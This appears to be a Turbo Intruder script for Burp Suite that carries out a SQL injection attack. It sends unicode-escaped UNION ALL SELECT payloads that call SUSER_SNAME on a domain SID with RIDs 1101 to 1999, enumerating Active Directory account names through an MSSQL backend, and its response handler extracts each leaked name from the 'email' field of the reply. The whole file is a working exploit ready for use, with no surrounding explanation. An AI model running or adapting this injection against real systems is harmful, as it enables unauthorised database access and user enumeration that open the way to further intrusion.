import binascii
import struct
import time

def unicode_escape(s):
    return "".join([r"\u{:04x}".format(ord(c)) for c in s])
    
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           pipeline=False
                           )

    sid = "0x0105000000000005150000001c00d1bcd181f1492bdfc23600020000"[:-8]
    payload_template = """test' UNION ALL SELECT 58,58,58,{},58-- -"""

    for i in range(1101, 2000):
        num = binascii.hexlify(struct.pack("<I", i)).decode()
        value = "SUSER_SNAME(%s%s)" % (sid, num)
        payload = unicode_escape(payload_template.format(value))
        engine.queue(target.req, payload)
        time.sleep(0.2)


def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    if req.status != 404:
        if (req.response.split('"email":"')[1].split("\",\"src")[0] != ""):
            req.label = req.response.split('"email":"')[1].split("\",\"src")[0]
            table.add(req)
